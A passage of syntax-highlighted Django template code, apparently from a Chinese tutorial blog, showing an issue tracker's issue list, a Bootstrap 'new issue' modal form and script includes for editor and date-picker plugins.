class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-success btn-sm"</span> <span class="attr">data-toggle</span>=<span class="string">"modal"</span> <span class="attr">data-target</span>=<span class="string">"#addModal"</span>&gt;</span>新建问题<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span> <span class="attr">data-toggle</span>=<span class="string">"modal"</span> <span class="attr">data-target</span>=<span class="string">"#inviteModal"</span>&gt;</span>邀请成员<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">class</span>=<span class="string">"issues-list"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    &#123;% for item in issues_obj_list %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"number"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-circle text-&#123;&#123; item.priority &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'issues_detail' project_id=request.tracer.project.id issues_id=item.id %&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>&#123;% string_just item.id %&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"issue"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'issues_detail' project_id=request.tracer.project.id issues_id=item.id %&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>&#123;&#123; item.subject &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tags"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"type"</span> <span class="attr">style</span>=<span class="string">"background-color: #56b8eb"</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; item.issues_type.title &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-refresh"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; item.get_status_display &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-user-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; item.creator.username &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;% if item.assign %&#125;</span><br><span class="line">                                        <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-hand-o-right"</span></span></span><br><span class="line"><span class="tag">                                               <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; item.assign.username &#125;&#125;</span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">                                    &#123;% if item.end_date %&#125;</span><br><span class="line">                                        <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-calendar"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; item.end_date &#125;&#125; 截止</span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-clock-o"</span></span></span><br><span class="line"><span class="tag">                                           <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; item.latest_update_datetime &#125;&#125; 更新</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    &#123;% endfor %&#125;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">&lt;!-- 分页的相关代码  --&gt;</span></span><br><span class="line">            </span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Modal --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"addModal"</span> <span class="attr">class</span>=<span class="string">"modal fade bs-example-modal-lg"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">aria-labelledby</span>=<span class="string">"myLargeModalLabel"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog modal-lg"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span>&gt;</span>新建问题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span> <span class="attr">style</span>=<span class="string">"padding-right: 40px"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"addForm"</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span><br><span class="line">                        &#123;% csrf_token %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.issues_type.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.issues_type.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; form.issues_type &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.subject.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.subject.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.subject &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.module.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.module.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; form.module &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.desc.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.desc.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"editor"</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.desc &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.status.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.status.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.status &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.priority.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.priority.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.priority &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.assign.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.assign.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.assign &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.attention.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.attention.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.attention &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.start_date.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.start_date.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-calendar"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.start_date &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.end_date.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.end_date.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-calendar"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.end_date &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.mode.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.mode.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.mode &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.parent.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.parent.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.parent &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>取 消<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"btnAddSubmit"</span>&gt;</span>添 加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 邀请成员的模态框代码 --&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/editormd.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/js/bootstrap-datepicker.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/locales/bootstrap-datepicker.zh-CN.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/js/bootstrap-select.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/js/i18n/defaults-zh_CN.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> WIKI_UPLOAD_URL = <span class="string">"&#123;% url 'wiki_upload' project_id=request.tracer.project.id%&#125;"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> INVITER_URL = <span class="string">"&#123;% url 'inviter_url' project_id=request.tracer.project.id%&#125;"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            bindBootStrapShownEvent();</span><br><span class="line">            initDatePicker();</span><br><span class="line">            bindAddSubmit();</span><br><span class="line">initDatePicker();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">/* Bootstrap-datepicker日期选择器 */</span></span></span><br><span 